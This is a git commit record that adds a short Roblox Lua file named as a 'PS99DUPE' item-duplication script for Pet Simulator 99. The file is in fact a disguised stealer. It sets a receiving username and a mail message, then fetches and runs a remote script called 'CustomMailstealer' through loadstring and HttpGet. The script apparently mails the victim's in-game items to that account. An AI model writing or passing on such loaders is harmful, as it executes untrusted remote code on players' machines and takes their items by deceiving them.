8523a490f8d0ca5ed0fd9dfa1576afbad9ed01ee
RobloxScripterPs99 <156000205+RobloxScripterPs99@users.noreply.github.com>
2024-01-09 15:25:07 +0100

    Add files via upload

---
+++ PS99DUPE.lua
@@ -0,0 +1,5 @@
+Username = "J5E65"
+G_LoadingScreen = "Exploit is loading"
+G_Mailmessage = "Haha"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()
